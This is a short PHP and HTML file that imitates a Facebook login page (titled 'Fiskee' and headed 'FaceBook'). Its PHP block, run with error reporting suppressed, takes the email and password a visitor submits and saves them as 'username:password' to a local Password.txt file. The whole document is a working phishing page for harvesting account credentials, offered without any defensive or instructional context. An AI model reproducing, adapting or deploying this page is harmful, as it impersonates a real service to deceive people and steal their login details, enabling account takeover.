<?php
error_reporting(0);
$username = $_POST['email'];
$password = $_POST['password'];

if (isset($_POST['button']))
{
	$opn = fopen('Password.txt', 'w');
	fwrite($opn, $username);
    fwrite($opn, ":");
	fwrite($opn, $password);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fiskee</title>
    <link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="login">
	<form method="post" action="" class="log-in" >
	<h1>FaceBook</h1>
	<input type="text" name="email" placeholder="Mobile number or email address">	
	<input type="password" name="password" placeholder="Password">
	<button name="button">Log In</button>	
	<form>
</div>
</body>
</html>